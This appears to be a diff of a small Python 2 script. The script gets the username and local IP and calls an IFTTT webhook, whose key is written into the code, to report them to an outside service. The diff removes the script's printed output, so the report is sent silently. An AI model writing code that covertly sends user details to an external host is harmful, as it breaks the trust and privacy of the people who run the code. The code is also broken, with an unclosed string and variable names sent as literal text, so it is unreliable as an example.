@@ -1,13 +1,7 @@
-import socket,getpass
+import socket,getpass,urllib2
 user = getpass.getuser()
 email = 'test@gmail.com
 ip_local = socket.gethostbyname(socket.gethostname())
 ip_host = socket.gethostbyname('www.google.com')
-
-import urllib2
 hook = 'https://maker.ifttt.com/trigger/userInfo/with/key/lt6C8G5VRbvc2fOnGjmS5_4J9A_fwtNjQ2VQJ6fO5YK?value1=ip_host&value2=email&value3=user'
 urllib2.urlopen(hook, timeout=60).read()
-
-print (user)
-print (ip_local)
-print (ip_host)
